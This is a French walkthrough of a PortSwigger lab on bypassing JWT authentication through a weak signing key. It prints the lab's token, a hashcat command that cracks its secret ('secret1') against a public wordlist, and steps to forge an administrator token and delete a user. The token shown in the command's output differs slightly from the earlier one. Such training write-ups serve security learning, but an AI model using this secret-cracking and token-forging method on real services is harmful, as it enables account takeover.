# Lab

https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key

## Solution

Quand on se connecte sur le lab, on a un JWT dans un cookie.

```
eyJraWQiOiI3OWVkZGRhYi1iY2JlLTRmZTEtYTNiMi1mM2M0YTIxMGFjNGIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwMjUwODU2OH0.Udrat0ipn1mPsL0lZ-vQEKenzg9RkMQTbmbDPUEF_q4
```

Le body du JWT décodé est le suivant :

```json
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1702506906
}
```

Si on passe le JWT dans hashcat pour le cracker avec [une liste de secrets faibles](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list), on trouve le secret `secret1` :

```bash
hashcat -a 0 -m 16500 eyJraWQiOiI3OWVkZGRhYi1iY2JlLTRmZTEtYTNiMi1mM2M0YTIxMGFjNGIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE3MDI1MDg1Njh9.3lXSrut87b7-g9Yj-fw9pqptefSJeN3LSc7mom5Zym8 C:\Users\a\Documents\git\BSCP-CheetSheet\JWT\jwt.secrets.list

eyJraWQiOiI3OWVkZGRhYi1iY2JlLTRmZTEtYTNiMi1mM2M0YTIxMGFjNGIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImVV4cCI6MTcwMjUwODU2OH0.Udrat0ipn1mPsL0lZ-vQEKenzg9RkMQTbmbDPUEF_q4:secret1
```

Ensuite on utilise ce secret pour forger notre propre JWT avec `administrator` en `sub` grace à [jwt.io](https://jwt.io/).

Puis avec ce JWT on a accès à la page d'administration et on peut supprimer l'utilisateur `carlos` pour valider le lab.